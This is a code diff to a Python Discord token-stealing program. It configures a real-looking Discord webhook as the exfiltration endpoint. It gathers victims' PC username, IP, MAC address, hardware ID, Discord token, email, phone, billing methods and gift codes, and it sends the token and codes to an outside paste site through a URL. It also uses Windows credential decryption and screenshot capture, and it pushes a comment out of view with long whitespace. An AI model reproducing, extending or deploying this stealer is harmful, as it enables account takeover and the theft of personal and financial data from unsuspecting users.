@@ -26,9 +26,9 @@ from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
 
-webhook = "%webhook_here%"
-ping = "%ping_enabled%"
-pingType = "%ping_type%"
+webhook = "https://discord.com/api/webhooks/992247074835935312/RWqxWJSnzNsCOtbAIwt7TxVmwLvX0CIfrCFMFGJMBXBSjUIHehl7JbTVgHsmw3rPO48u"
+ping = False
+pingType = "none"
 
 dummy_message = "Loading..." # change if you want
 print(dummy_message)
@@ -105,7 +105,7 @@ def get_inf():
     ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                 0].TotalVisibleMemorySize) / 1048576, 0)
 
-    embed.add_field(name="SYSTEM INFO", value=f'''💻`PC Username:` **{pc_username}**\n<:computer_2:996126609650225322>`PC Name:` **{pc_name}**\n🌐`OS:` **{computer_os}**\n\n👀`IP:` **{ip_address}**\n🍏`MAC:` **{mac_address}**\n🔧`HWID:` **{hwid}**<:cpu:996126314555768882>`CPU:` **{cpu.Name}**\n<:gpu:996126996952272906>`GPU:` **{gpu.Name}**\n<:rgbram:996127801025495081>`RAM:` **{ram}GB**''', inline=False)
+    embed.add_field(name="SYSTEM INFO", value=f'''💻 `PC Username:` **{pc_username}**\n<:computer_2:996126609650225322> `PC Name:` **{pc_name}**\n🌐 `OS:` **{computer_os}**\n\n👀 `IP:` **{ip_address}**\n🍏 `MAC:` **{mac_address}**\n🔧 `HWID:` **{hwid}**<:cpu:996126314555768882> `CPU:` **{cpu.Name}**\n<:gpu:996126996952272906> `GPU:` **{gpu.Name}**\n<:rgbram:996127801025495081> `RAM:` **{ram}GB**''', inline=False)
 
 @try_extract
 class grabtokens():
@@ -286,8 +286,8 @@ class grabtokens():
             except:
                 all_codes = "❌ No gift codes found"
                 title = ""
-
-            embed.add_field(name="DISCORD INFO", value=f'''<:1119pepesneakyevil:972703371221954630>`Discord Username:` **{username}** \n<:gmail:996083031632773181>`Email:` **{email}**\n<:mobilephone:996101721879224331>`Phone:` **{phone}**\n\n<:2fa:996102455744012428>`2FA:` **{mfa}**\n<a:nitroboost:996004213354139658>`Nitro:` **{nitro}**\n<:billing:996099943574012024>`Billing:` **{methods}**\n\n<:pepehappy:996100452112400526>`Token:` **{token}**\n\n:gift:`{title}:` **{all_codes}**''', inline=False)
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          #addidix's cool little copy n paste website
+            embed.add_field(name="DISCORD INFO", value=f'''<:1119pepesneakyevil:972703371221954630> `Discord Username:` **{username}** \n<:gmail:996083031632773181> `Email:` **{email}**\n<:mobilephone:996101721879224331> `Phone:` **{phone}**\n\n<:2fa:996102455744012428> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:996099943574012024> `Billing:` **{methods}**\n\n<:pepehappy:996100452112400526> `Token:` **{token}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={token})\n\u200b\n:gift: `{title}:`\n**{all_codes}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={all_codes})\u200b''', inline=False)
 
 def ss():
     ImageGrab.grab(
